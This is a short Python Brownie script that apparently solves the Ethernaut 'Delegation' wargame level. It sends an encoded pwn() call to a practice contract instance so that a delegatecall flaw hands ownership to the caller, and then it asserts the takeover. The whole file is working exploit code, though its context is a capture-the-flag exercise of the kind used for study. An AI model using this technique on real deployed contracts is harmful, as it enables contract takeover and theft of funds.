from brownie import interface, accounts, config, Wei, Contract

INSTANCE_ADDRESS = "0x91cA3266012ce2cdBfe9e838365008c4baDa0fb7"
ACCOUNT = accounts.add(config["wallets"]["from_key"])

ADDRESS_TO_SEND = "0x468F2866Cd6aEcf640644885F6Cad63Ff4f9BC4c"

def hack():
    # grab the Delegation contract Object
    instance_contract = interface.IDelegation(INSTANCE_ADDRESS)

    function_signature = instance_contract.pwn.encode_input()
    print(function_signature)
    # hack the contract
    tx = ACCOUNT.transfer(INSTANCE_ADDRESS, "1", data = function_signature, gas_limit = "10000000", allow_revert= True)
    tx.wait(1)

    assert(instance_contract.owner() == ACCOUNT)
        
    print(f"Contract has been hacked. Now {instance_contract.owner()} is the new Owner")

def main():
    hack()
